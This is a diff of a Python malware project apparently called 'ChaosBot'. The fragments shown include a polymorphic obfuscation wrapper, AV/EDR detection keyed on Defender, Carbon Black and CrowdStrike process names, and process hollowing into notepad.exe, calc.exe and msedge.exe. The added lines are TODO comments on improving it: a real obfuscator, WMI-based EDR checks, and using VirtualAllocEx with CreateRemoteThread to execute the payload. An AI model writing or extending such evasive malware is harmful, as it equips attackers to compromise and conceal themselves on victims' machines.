@@ -62,6 +62,7 @@ def real_decrypt(encrypted_data):
     return plaintext.decode('utf-8')
 
 def polymorph_code(func):
+    # TODO: Replace with a real obfuscator like PyObfuscate or inline assembly generation.
     """Basic polymorphic wrapper: shuffles variable names and adds junk code."""
     import ast, astunparse
     tree = ast.parse(func.__code__.co_code.decode('utf-8', errors='ignore'))
@@ -203,6 +204,7 @@ class ChaosBot:
         self.fileless_exec()
 
     def detect_av_edr(self):
+        # TODO: Query WMI for running services (e.g., wmi.Win32_Service) and check for EDR signatures dynamically.
         """Pause if AV/EDR detected."""
         av_processes = ["MsMpEng.exe", "cb.exe", "csagent.exe"]
         for proc in subprocess.check_output("tasklist", shell=True).decode().splitlines():
@@ -212,6 +214,7 @@ class ChaosBot:
         return False
 
     def inject_hollow(self, target_path=None):
+        # TODO: Add error checking for VirtualAllocEx and use CreateRemoteThread to execute the payload.
         """Process hollowing with multiple targets."""
         k32 = ctypes.windll.kernel32
         targets = ["notepad.exe", "calc.exe", "msedge.exe"]
